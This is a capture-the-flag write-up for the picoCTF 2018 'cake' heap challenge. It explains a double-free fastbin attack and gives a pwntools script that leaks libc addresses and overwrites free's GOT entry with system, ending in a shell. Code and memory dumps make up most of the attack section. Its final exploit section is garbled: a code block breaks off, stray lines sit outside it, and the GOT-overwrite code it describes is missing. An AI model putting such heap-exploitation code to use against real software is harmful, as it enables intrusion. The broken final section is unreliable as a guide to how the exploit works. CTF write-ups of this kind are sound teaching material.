### Challenge: [cake](../ctfs/picoctf18/pwn/cake/cake) [libc](../ctfs/picoctf18/pwn/cake/libc.so.6)

### Reversing
```bash
$ file ./cake
cake: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5422c9f23d49487ec57700c323eb018293dd4f9c, not stripped
$ checksec ./cake
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE
```

Well a pwn challenge with PIE disabled, we don't see that often (but yay!). And RELRO is not there also, meaning we can do GOT overwrite to get shell.  

Challenge binary provides five options  
**M** - Allows us to *Make* (allocate) a `cake` structure where we can specify `name` of max 8 bytes and `price` for that `cake`.  
**W** - If you want to wait for more customers to come this is the option. Does not make much sense now but quite useful. (explained later)  
**S** - Allows us to *Serve* the customer our cake based on its `index` value. Basically freeing the `cake` structure.  
**I** - Inspecting the cake will print its contents (`name` and `price`) on *stdout*.  
**C** - Finally if you are tired, you can *close* the shop and `return` from the `main` function.  

Now we know the basic functionality of the binary. Lets see how all the chunks are actually laid out in memory.  
To do that I made a dummy `cake` with `name` "AAAA" and `price` 16. When I check this in *gdb*, it looks something like below (heap addresses may seem different because its from my local VM).
```
0x564904bd0010:	0x0000000000000000	0x0000000000000021
0x564904bd0020:	0x0000000000000010	0x0000000041414141
0x564904bd0030:	0x0000000000000000	0x0000000000020fd1
0x564904bd0040:	0x0000000000000000	0x0000000000000000
```

Here we see that `*cake` points to its `price` and `*cake + 0x8` points to its `name`.  
If we look at IDA we find that the `counter` to number of customer at the shop, is stored in .bss segment. Whenever we call `Wait` for customer or even do any operation for that matter, `counter` gets increased randomly by either 0, 1 or 2, cool.  
There is also a `shop` variable on .bss which keeps track of all the available `cake`s and binary access all the `cake` structures referencing from this. All the pointer of `cake`s reside on .bss that are access relatively from address of `shop` by challenge binary.    
Thats enough of the working of binary. Lets discover bugs and exploit them (*believe me there are some interesting bugs*).  

### Bug Hunting

There are mainly three bugs/features that I used for my exploit.
- As we know that we can `serve` (free) cakes to customers based on their index. Here lies our first bug. Binary doesnt check if a cake is already served or not. It just checks whether provided `index` is less than or equal to total number of `cake`s created and max number of cakes should be less than 16.  (*allows us to do fastbin attack*)
- `counter` can be used to created fake `size` of heap chunk which can be used to return address on .bss from malloc.
- There is a subtle bug in `make` function. If you look carefully at the IDA code snippet below. If we can somehow overwrite value at `*(&shop->sold + i + 2LL)` in between `name` overwrite and `price` overwrite, we can get arbitrary write. Confused? It should get more clearer in exploitation section :)  
```
void __fastcall make(s_shop *shop)
{
...
      printf("Made cake %d.\nName> ", (unsigned int)i);
      fgets_eat((char *)(*(&shop->sold + i + 2LL) + 8), 8);
      printf("Price> ");
      v1 = (__int64 *)*(&shop->sold + i + 2LL);
      *v1 = get();
...
}
```  

### Exploitation  

So here I will explain my exploit script in pieces because I find this approach more easy to explain how exploitation works and it also connects techniques specified in write up with exploitation script at the same time.  

```python
from pwn import *
import re,sys

def make(name, price):
    r.sendlineafter("> ", "M")
    r.sendlineafter("Name> ", name)
    r.sendlineafter("Price> ", str(price))

def wait_c():
    r.sendlineafter("> ", "W")

def serve(index):
    r.sendlineafter("> ", "S")
    r.sendlineafter("> ", str(index))

def inspect(index):
    r.sendlineafter("> ", "I")
    r.sendlineafter("> ", str(index))

libc = ELF('./libc.so.6')
#r = process(['./ubuntu-xenial-amd64-libc6-ld-2.23.so', './cake'], env={"LD_PRELOAD":"./libc.so.6"})
r = remote("2018shell1.picoctf.com", 42542)
```

So here I created some functions to make my life a little easier while interacting with the process, nothing fancy.  

```python
#################
make("daaa", 0x656565) #0
make("eaaa", 0x656565) #1
make("AAAA"*10, 10) #2
make("BBBB"*10, 10) #3
#gdb.attach(r)
serve(0)
serve(1)
serve(0)
```    
In above code I have `double-freed` 0th `cake` which causes price of 0th `cake` to convert into a heap address. As this is fastbin, it will be pointing to next chunk in free list meaning 1th `cake`. This you can see in the heap dump below.
```
0x5622d06c0010:	0x0000000000000000	0x0000000000000021
0x5622d06c0020:	0x00005622d06c0030	0x0000000061616164
0x5622d06c0030:	0x0000000000000000	0x0000000000000021
0x5622d06c0040:	0x00005622d06c0010	0x0000000061616165
0x5622d06c0050:	0x0000000000000000	0x0000000000000021
0x5622d06c0060:	0x000000000000000a	0x0041414141414141
0x5622d06c0070:	0x0000000000000000	0x0000000000000021
0x5622d06c0080:	0x000000000000000a	0x0042424242424242
0x5622d06c0090:	0x0000000000000000	0x0000000000020f71
```

```python
#leak heap
inspect(0)
r.recvuntil("for $")
heap_addr = int(r.recvline().strip(), 10)
log.info("heap: 0x{:x}".format(heap_addr))
```

Now I can just print the price of 0th `cake` to leak heap address. Actually heap leak is never getting used in exploit ahead but while solving challenges I just leak everything I can ;P  

```python
#############
#wait for customers to be 0x21
while True:
    rd = r.recvuntil("waiting.")
    got = re.findall(ur'and have (.+?) customers waiting', rd)[0]
    if int(got) < 0x21:
        log.info(got)
        wait_c()
        #r.interactive()
    elif int(got) == 0x21:
        break
    else:
        sys.exit()

#############
make("aaaa", 0x6030E0) #4 # (&shop->sold + 0 + 2LL) - 0x10  == 0x6030E0
#gdb.attach(r)
make("bbbb", u64('/bin/sh\x00')) #5 # I free this chunk at the end to pop shell!
make("aaaa", 0x31313131) #6
make(p64(0x21), 0x603088) #7
inspect(0)
libc_base = u64(r.recv(6) + "\x00"*2) - 0x3af60
log.info("libc base: 0x{:x}".format(libc_base))
```

In above code I am setting the `counter` value to be `0x21` so that we can do a `fastbin-attack` to change a `cake` pointer on .bss to GOT address. That will allow us to leak the address of GOT function's address and effectively leaking `libc_base`. After enough `wait`ing I start doing a typical `fastbin-attack`. As in previous code I had freed 0th `cake` twice, first I change the 0th `cakes` free-list pointer to address of first `cake` pointer on .bss - 0x10. So that on fourth malloc call I can change the first `cake` pointer to `0x603088` (*exit's got address*). Now we can `inspect` 0th `cake` to leak `libc_base`, cool!  

Here I have put a `0x21` in the  `name` of newly allocated cake chunk on .bss . I did that so that I dont need to make `counter` `0x21` repeatedly.  

I have also specified `/bin/sh\x00`, not important right now but you know where I will use it at the end ;)  
After doing the libc leak our .bss looks like below.  
```
0x6030e0:	0x0000000000cacaca	0x0000000000000022
0x6030f0:	0x0000000000603088	0x0000000000000021
0x603100:	0x0000564b5116f060	0x0000564b5116f080
0x603110:	0x0000564b5116f020	0x0000564b5116f040
0x603120:	0x0000564b5116f020	0x00000000006030f0
```

```python
#############
#gdb.attach(r)
serve(3)
serve(4)
serve(3)

make("aaaa", 0x6030f0) #8 #customer number -0x8
make("bbbb", 0x6030f8) #9
make("aaaa", 0x31313131) #10
#gdb.attach(r)
make(p64(0x6030f0), 0x21) #11
```
In the code above I am doing another `fastbin-attack` and this time it is to create another `0x21` in the .bss just after our previous `0x21`. This is done because I want to exploit our `third-bug`. It will get more clear in next part of the exploit.  
For now below is the .bss dump after all the actions above.  
```
0x6030e0:	0x0000556ae9d4fc25	0x0000000000000022
0x6030f0:	0x0000000000603088	0x0000000000000021

0x603140:	0x0000556ab7d90080	0x0000000000603100
```

system_addr = libc_base + libc.symbols['system']
#gdb.attach(r)

###################
r.interactive()
```
I again create a scenario for `fastbin-attack` but if you notice I have double freed two chunks. Meaning in the fourth malloc and fifth malloc, I will be allocating and overwriting free chunks specified in first and second allocations.  
First I allocate `0x6030f8`, overwrite it at `0x603108` with `Null`s. Hmm why did I need to do that. Well when a `cake` gets allocated, an iterator runs through this array of `cake` pointers on .bss segment. When iterator finds a `Null` pointer, `cake` is allocated and the address of that `cake` is stored here.  
After that I filled `0x603108` with `Null`s, address of next allocation of `cake` will be stored at `0x603108`. Down is the dump till this point.  

```
0x6030e0:	0x000100bb5e33bebe	0x0000000000000021
0x6030f0:	0x0000000000603088	0x0000000000000021
0x603100:	0x0000000000000021	0x0000000000000000
0x603110:	0x0000000000000000	0x00005593a8e22040
0x603120:	0x00005593a8e22020	0x00000000006030f0
0x603130:	0x00005593a8e22080	0x00005593a8e22020
0x603140:	0x00005593a8e22080	0x0000000000603100
0x603150:	0x00005593a8e22080	0x00005593a8e22020
0x603160:	0x00005593a8e22080	0x0000000000603108
```

Now when I `make` another `cake` it allocates `0x6030f0` chunk and which will have data part at `0x603100`. Address of this chunk will be stored at `0x603108` which resides inside the allocated chunk for this cake. Now I set the name value to `p64(0x603018)`. This will cause value of `cake` pointer to point to `0x603018` (*GOT of free function*). Now when `price` gets written, `make` function fetches the `cake` pointer again which is pointing to `free_got` now. And `free_got` will be overwritten with `price` value (*address of system function*).  
Now If we free the `cake` with string `/bin/sh\x00` that I created above, a shell gets popped!  
The whole script can be found [here](../ctfs/picoctf18/pwn/cake/final.py)  

I found this challenge quite interesting because it took me quite some time to find the bug/feature in `make` function to get arbitrary write.  
In overall PicoCTF was a fun experience. I finished **#6** but I could not solve two challenges and that was frustrating :D
